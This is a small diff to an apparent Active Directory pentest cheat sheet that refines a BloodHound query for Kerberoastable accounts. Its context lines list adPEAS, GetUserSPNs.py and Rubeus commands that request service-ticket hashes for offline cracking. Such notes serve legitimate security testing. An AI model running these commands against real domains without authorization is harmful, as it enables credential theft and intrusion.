@@ -42,7 +42,7 @@
 - `Import-Module .\adPEAS.ps1; Invoke-adPEAS -Domain '<domain>' -Server '<dc_fqdn>'`
 
 ## Kerberoasting >>> Hash TGS
-- `MATCH (u:User {hasspn:true})) RETURN u`
+- `MATCH (u:User) WHERE u.hasspn=true AND u.enabled = true AND NOT u.objectid ENDS WITH '-502' AND NOT COALESCE(u.gmsa, false) = true AND NOT COALESCE(u.msa, false) = true RETURN u`
 - `GetUserSPNs.py -request -dc-ip <dc_ip> <domain>/<user>:<password>`
 - `Rubeus.exe kerberoast`
 
